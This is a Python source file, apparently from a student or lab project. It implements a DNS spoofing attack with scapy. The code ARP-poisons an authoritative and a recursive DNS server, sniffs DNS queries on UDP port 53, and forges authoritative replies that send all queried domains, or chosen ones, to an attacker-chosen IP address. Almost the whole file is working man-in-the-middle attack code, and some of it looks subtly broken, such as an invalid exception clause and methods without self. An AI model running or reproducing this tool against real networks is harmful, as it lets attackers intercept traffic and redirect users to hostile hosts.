from scapy.all import *
from scapy.layers.l2 import *
import ARP as arpattack
import threading
from netifaces import AF_INET
import netifaces as ni


class DNSattack:

    exit_loop = None

    def __init__(self, auth, rec, domain, ip_insert):
        # Parameters
        self.auth = auth
        self.rec = rec
        self.domain = domain
        self.ip_insert = ip_insert

    # The function that gets called when we spoof all domains
    def start_spoof_all(ip_insert, auth, rec):
        # Get the MAC addresses of the servers
        auth_mac = DNSattack.get_mac(auth)
        rec_mac = DNSattack.get_mac(rec)

        # Start ARP poisoning the servers using ARP.py
        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
        poison.start()

        DNSattack.exit_loop = False

        # Start sniffing packets based on their port number and destination IP address
        sniff(filter='udp port 53 and ip dst %s' % auth, prn=DNSattack.spoof_all(ip_insert))

    # The function that takes care of the sniffed packets
    def spoof_all(ip_insert):
        print("> DNS: Starting packet scan and manipulation")

        def reply_to_all(pkt):
            # Creates a reply DNS packet from the received DNS packet by reversing addresses and sending a DNSRR
            # containing the IP address the attacker selected
            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP]:
                spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                arcount=0, an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
                send(spoof_pkt, verbose=1)
                print("> DNS: Packet forged successfully")
            # In case this was not a DNS packet (unlikely), forward it
            else:
                send(pkt, verbose=0)
        # Check if we still have to sniff or not
        if not DNSattack.exit_loop:
            return reply_to_all
        else:
            print("> DNS: Spoofing stopped")

    # The function that is being called when we spoof a (list of) domain(s)
    def start_spoof(domain, ip_insert, auth, rec):
        # Get the MAC addresses of the servers
        auth_mac = DNSattack.get_mac(auth)
        rec_mac = DNSattack.get_mac(rec)

        # Start ARP poisoning the servers using ARP.py
        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
        poison.start()

        DNSattack.exit_loop = False

        # Start sniffing packets based on their port number and destination IP address
        sniff(filter='udp port 53 and ip dst %s' % auth, prn=DNSattack.spoof(domain, ip_insert))

    # The function that takes care of the sniffed packets
    def spoof(domain, ip_insert):
        print("> DNS: Starting packet scan and manipulation")

        def reply_to_single(pkt):
            # Creates a reply DNS packet from the received DNS packet by reversing addresses and sending a DNSRR
            # containing the IP address the attacker selected
            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP]:
                if domain in str(pkt[DNSQR].qname, 'utf-8'):
                    spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                    arcount=0, an=(DNSRR(
                                        rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
                    send(spoof_pkt, verbose=0)
                    print("> DNS: Packet forged successfully")
                # If this DNS packet was not for the targeted domain(s), forward it
                else:
                    send(pkt, verbose=0)
            # In case this was not a DNS packet (unlikely), forward it
            else:
                send(pkt, verbose=0)
        # Check if we still have to sniff or not
        if not DNSattack.exit_loop:
            return reply_to_single
        else:
            print("> DNS: Spoofing stopped")

    # Get the MAC address of both the local DNS and the authoritative DNS using the NetworkScan file approach
    def get_mac(ip_address):
        list_interfaces = []
        try:
            f = open("/proc/net/if_inet6", "r")
        except IOError and err:
            return list_interfaces
        l = f.readlines()
        for i in l:
            # addr, index, plen, scope, flags, ifname
            temp = i.split()
            list_interfaces.append(str(temp[5]))
        for interface in list_interfaces:
            conf.iface = interface
            ip = ni.ifaddresses(interface)[AF_INET][0]["addr"]
            if ARP(pdst=ip_address+"/24") == ARP(pdst=ip+"/24"):
                # Request the MAC address of given IP address
                ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2)

                for snd, rcv in ans:
                    # Check if the MAC address is actually from the right IP address
                    if rcv.sprintf(r"%ARP.psrc%") == ip_address:
                        return rcv.sprintf(r"%Ether.src%")
